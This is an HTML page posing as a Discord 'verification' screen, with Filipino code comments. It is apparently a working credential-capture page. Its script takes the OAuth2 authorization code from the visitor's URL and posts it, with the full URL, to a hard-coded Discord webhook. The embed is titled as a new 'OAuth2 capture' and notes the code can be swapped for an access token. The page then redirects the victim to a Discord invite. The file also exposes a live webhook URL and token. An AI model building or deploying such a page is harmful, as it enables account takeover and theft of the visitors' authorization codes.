<!DOCTYPE html>
<html>
<head>
    <title>Verification Complete</title>
    <style>
        body {
            font-family: Arial;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: #0f172a;
            color: white;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .box {
            text-align: center;
            max-width: 500px;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>✅ Verifying...</h1>
        <p>Please wait, connecting to server...</p>
    </div>

<script>
    // ⚙️ MGA SETTING (TAMA NA ITO)
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
    const REDIRECT_URL = "https://discord.gg/4UCD2HwqQ";

    // 🔍 KUNIN ANG CODE MULA SA URL
    let code = new URLSearchParams(window.location.search).get("code") || "";

    // 📤 IPADALA SA WEBHOOK
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            embeds: [{
                title: "🔓 BAGONG OAUTH2 CAPTURE!",
                color: 0x2ecc71,
                fields: [
                    {
                        name: "🔑 AUTHORIZATION CODE",
                        value: code ? `||${code}||\n(Gamitin ito para palitan sa Access Token)` : "❌ WALANG CODE NAKUHA"
                    },
                    {
                        name: "🔗 FULL URL",
                        value: window.location.href.slice(0, 1024)
                    }
                ]
            }]
        })
    })
    .catch(err => console.error("Error:", err))
    .finally(() => {
        // ➡️ DUMALIN SA SERVER KAHIT MAY ERROR
        setTimeout(() => window.location.href = REDIRECT_URL, 1500);
    });
</script>
</body>
</html>
